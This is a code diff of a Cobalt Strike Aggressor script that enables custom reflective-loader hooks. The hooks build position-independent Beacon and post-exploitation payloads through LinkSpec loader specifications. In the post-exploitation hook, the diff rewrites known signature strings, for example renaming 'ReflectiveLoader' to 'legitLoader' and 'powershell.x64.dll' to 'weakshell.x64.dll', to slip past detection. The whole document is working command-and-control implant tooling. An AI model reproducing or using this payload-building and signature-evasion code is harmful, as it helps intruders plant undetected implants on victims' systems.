@@ -79,13 +79,13 @@ set BEACON_RDLL_GENERATE
 
     # The output will be a PIC blob that contains the loader and Beacon DLL. If anything fails
     # and the script returns $null, it tells Cobalt Strike to fallback to its default loader.
-    print_info ( strlen ( $final ) );
     if ( strlen ( $final ) == 0 )
     {
         warn ( "Failed to build payload" );
         return $null;
     }
 
+    print_info ( strlen ( $final ) );
     return $final;
 }
 
@@ -110,25 +110,34 @@ set BEACON_RDLL_GENERATE_LOCAL
 
     print_info ( "BEACON_RDLL_GENERATE_LOCAL" );
 
-#     $spec_path = getFileProper ( script_resource ( "local-loader" ), "loader.spec" );
-#     $spec      = [ LinkSpec Parse: $spec_path ];
+    $spec_path = getFileProper ( script_resource ( "local-loader" ), "loader.spec" );
+    $spec      = [ LinkSpec Parse: $spec_path ];
 
-#     $hash_map  = [ new HashMap ];
+    $hash_map  = [ new HashMap ];
 
-#     [ $hash_map put: "\$GMH", cast ( $gmh, 'b' ) ];
-#     [ $hash_map put: "\$GPA", cast ( $gpa, 'b' ) ];
+    [ $hash_map put: "\$GMH", cast ( $gmh, 'b' ) ];
+    [ $hash_map put: "\$GPA", cast ( $gpa, 'b' ) ];
 
-#     $final = [ $spec run: $beacon, $hash_map ];
+    $final = [ $spec run: $beacon, $hash_map ];
 
-#     if ( strlen ( $final ) == 0 )
-#     {
-#         warn ( "Failed to build payload" );
+    if ( strlen ( $final ) == 0 )
+    {
+        warn ( "Failed to build payload" );
         return $null;
-#     }
+    }
 
-#     return $final;
+    print_info ( strlen ( $final ) );
+    return $final;
 }
 
+# ------------------------------------
+# $1 = DLL file name
+# $2 = DLL content
+# $3 = arch
+# $4 = parent Beacon ID
+# $5 = GetModuleHandle pointer
+# $6 = GetProcAddress pointer
+# ------------------------------------
 set POSTEX_RDLL_GENERATE
 { 
     local ( '$postex $arch $gmh $gpa $spec_path $spec $hash_map $final' );
@@ -146,27 +155,28 @@ set POSTEX_RDLL_GENERATE
 
     print_info ( "POSTEX_RDLL_GENERATE" );
 
-#     $postex = strrep_pad ( $postex, "w/hr", "err" );
-#     $postex = strrep_pad ( $postex, "[-]", "[!]" );
-#     $postex = strrep_pad ( $postex, "ReflectiveLoader", "legitLoader" );
-#     $postex = strrep_pad ( $postex, "invokeassembly.x64.dll", "revokeassembly.x64.dll" );
-#     $postex = strrep_pad ( $postex, "powershell.x64.dll", "weakshell.x64.dll" );
+    $postex = strrep_pad ( $postex, "w/hr", "err" );
+    $postex = strrep_pad ( $postex, "[-]", "[!]" );
+    $postex = strrep_pad ( $postex, "ReflectiveLoader", "legitLoader" );
+    $postex = strrep_pad ( $postex, "invokeassembly.x64.dll", "revokeassembly.x64.dll" );
+    $postex = strrep_pad ( $postex, "powershell.x64.dll", "weakshell.x64.dll" );
 
-#     $spec_path = getFileProper ( script_resource ( "postex-loader" ), "loader.spec" );
-#     $spec      = [ LinkSpec Parse: $spec_path ];
+    $spec_path = getFileProper ( script_resource ( "postex-loader" ), "loader.spec" );
+    $spec      = [ LinkSpec Parse: $spec_path ];
 
-#     $hash_map  = [ new HashMap ];
+    $hash_map  = [ new HashMap ];
 
-#     [ $hash_map put: "\$GMH", cast ( $gmh, 'b' ) ];
-#     [ $hash_map put: "\$GPA", cast ( $gpa, 'b' ) ];
+    [ $hash_map put: "\$GMH", cast ( $gmh, 'b' ) ];
+    [ $hash_map put: "\$GPA", cast ( $gpa, 'b' ) ];
 
-#     $final = [ $spec run: $postex, $hash_map ];
+    $final = [ $spec run: $postex, $hash_map ];
 
-#     if ( strlen ( $final ) == 0 )
-#     {
-#        warn ( "Failed to build package" );
+    if ( strlen ( $final ) == 0 )
+    {
+       warn ( "Failed to build package" );
        return $null;
-#     }
+    }
 
-#     return $final;
+    print_info ( strlen ( $final ) );
+    return $final;
 }
